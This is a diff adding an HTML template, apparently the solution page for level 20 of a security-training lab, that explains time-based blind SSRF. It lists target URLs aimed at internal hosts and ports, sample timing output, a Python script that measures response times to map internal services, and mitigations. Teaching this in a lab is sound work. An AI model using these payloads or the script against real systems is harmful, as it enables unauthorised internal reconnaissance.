@@ -1,0 +1,199 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 20 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 20 Solution: SSRF via Time-based Attacks</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates time-based blind SSRF exploitation, using response timing analysis to detect and enumerate internal services when direct responses are not available.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand timing attacks:</strong> Response time differences indicate service existence</li>
+                    <li><strong>Establish baseline timing:</strong> Measure normal response times</li>
+                    <li><strong>Test internal targets:</strong> Compare timing for different internal addresses</li>
+                    <li><strong>Statistical analysis:</strong> Use timing patterns to confirm service detection</li>
+                </ol>
+
+                <h4>Time-based SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic internal service timing
+Target URL: http://localhost:8080
+Timeout: 5000ms
+
+# Database service detection
+Target URL: http://127.0.0.1:3306
+Timeout: 3000ms
+
+# Web service enumeration
+Target URL: http://internal.admin.local:80
+Timeout: 10000ms
+
+# SSH service detection
+Target URL: http://192.168.1.100:22
+Timeout: 2000ms
+
+# Custom application ports
+Target URL: http://internal.service.local:8443
+Timeout: 15000ms</code></pre>
+                    </div>
+                </div>
+
+                <h4>Timing Analysis Techniques:</h4>
+                <ul>
+                    <li><strong>Connection timeout:</strong> Different timeouts for open vs closed ports</li>
+                    <li><strong>Service response time:</strong> Application-specific response patterns</li>
+                    <li><strong>Network latency:</strong> Internal vs external network timing</li>
+                    <li><strong>Protocol handshake:</strong> Different protocols have different timing</li>
+                </ul>
+
+                <h4>Statistical Analysis Methods:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Multiple request timing analysis
+Request 1: 2847ms (TIMEOUT)
+Request 2: 2851ms (TIMEOUT) 
+Request 3: 2849ms (TIMEOUT)
+Request 4: 2850ms (TIMEOUT)
+Request 5: 2848ms (TIMEOUT)
+
+# Statistical calculations
+Average: 2849ms
+Standard Deviation: 1.58ms
+Confidence Level: 99.7%
+
+# Comparison with non-existent service
+Request 1: 0ms (CONNECTION_REFUSED)
+Request 2: 0ms (CONNECTION_REFUSED)
+Request 3: 1ms (CONNECTION_REFUSED)
+
+# Conclusion: Consistent timeout = Service exists</code></pre>
+                    </div>
+                </div>
+
+                <h4>Advanced Timing Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># DNS resolution timing
+Target: internal.service.local (slow DNS = internal domain)
+Target: external.service.com (fast DNS = external domain)
+
+# SSL handshake timing
+Target: https://internal.ssl.local:443 (SSL negotiation timing)
+Target: http://internal.plain.local:80 (no SSL overhead)
+
+# Application-specific timing
+Target: http://database.internal:5432 (database connection timing)
+Target: http://cache.internal:6379 (cache service timing)
+
+# Load balancer detection
+Target: http://lb.internal:80 (load balancer response timing)
+Target: http://direct.internal:8080 (direct service timing)</code></pre>
+                    </div>
+                </div>
+
+                <h4>Timing Pattern Recognition:</h4>
+                <ul>
+                    <li><strong>Open port patterns:</strong> Consistent timeout or connection establishment</li>
+                    <li><strong>Closed port patterns:</strong> Immediate connection refused</li>
+                    <li><strong>Filtered port patterns:</strong> Long timeout with no response</li>
+                    <li><strong>Service-specific patterns:</strong> Application response timing signatures</li>
+                </ul>
+
+                <h4>Automation Scripts:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Python timing analysis script
+import requests
+import time
+import statistics
+
+def timing_analysis(target_url, samples=10):
+    times = []
+    for i in range(samples):
+        start = time.time()
+        try:
+            requests.get(target_url, timeout=5)
+        except:
+            pass
+        end = time.time()
+        times.append((end - start) * 1000)
+    
+    avg_time = statistics.mean(times)
+    std_dev = statistics.stdev(times)
+    
+    return {
+        'average': avg_time,
+        'std_dev': std_dev,
+        'samples': times
+    }
+
+# Usage
+result = timing_analysis('http://internal.service.local:8080')
+print(f"Average: {result['average']:.2f}ms")
+print(f"Std Dev: {result['std_dev']:.2f}ms")</code></pre>
+                    </div>
+                </div>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Timing analysis tools:</strong> Custom Python/Go scripts</li>
+                    <li><strong>Network delay measurement:</strong> ping, traceroute</li>
+                    <li><strong>Statistical analysis:</strong> R, Python scipy</li>
+                    <li><strong>Automated scanners:</strong> Custom timing-based port scanners</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Internal service discovery without direct responses</li>
+                    <li>Network topology mapping via timing analysis</li>
+                    <li>Service fingerprinting through timing signatures</li>
+                    <li>Bypass of response-based SSRF protections</li>
+                </ul>
+
+                <h4>Timing Attack Scenarios:</h4>
+                <ul>
+                    <li><strong>Port scanning:</strong> Detect open ports via timing differences</li>
+                    <li><strong>Service enumeration:</strong> Identify running services</li>
+                    <li><strong>Network mapping:</strong> Discover internal network structure</li>
+                    <li><strong>WAF bypass:</strong> Timing-based filter evasion</li>
+                </ul>
+
+                <h4>Challenges and Limitations:</h4>
+                <ul>
+                    <li><strong>Network jitter:</strong> Variable network conditions affect timing</li>
+                    <li><strong>Load balancing:</strong> Multiple backends create timing variance</li>
+                    <li><strong>Caching:</strong> Response caching affects timing patterns</li>
+                    <li><strong>Rate limiting:</strong> May introduce artificial delays</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Implement consistent timeout handling</li>
+                    <li>Add random delays to normalize response times</li>
+                    <li>Use connection pooling to reduce timing variance</li>
+                    <li>Monitor for timing-based attack patterns</li>
+                    <li>Implement proper network segmentation</li>
+                </ul>
+
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-lightbulb-fill me-2"></i>Advanced Technique</h5>
+                    <p class="mb-0">Time-based blind SSRF is a sophisticated technique that requires statistical analysis and patience. It's particularly useful when traditional SSRF detection methods fail.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level20" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level21" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
